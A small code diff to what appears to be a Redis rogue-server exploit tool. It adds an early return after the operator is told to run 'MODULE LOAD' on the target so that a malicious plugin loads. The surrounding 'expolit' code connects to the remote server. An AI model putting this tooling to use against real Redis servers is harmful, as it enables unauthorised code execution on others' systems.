@@ -118,6 +118,7 @@ def runserver(rhost, rport, passwd, lhost, lport, bind_addr, server_only):
         print('Waiting for connection...')
         rogue.exp()
         print('Payload sent.\nRun "MODULE LOAD /path/to/dbfile" on target redis server to enable the plugin.')
+        return
 
     # expolit
     remote = Remote(rhost, rport)
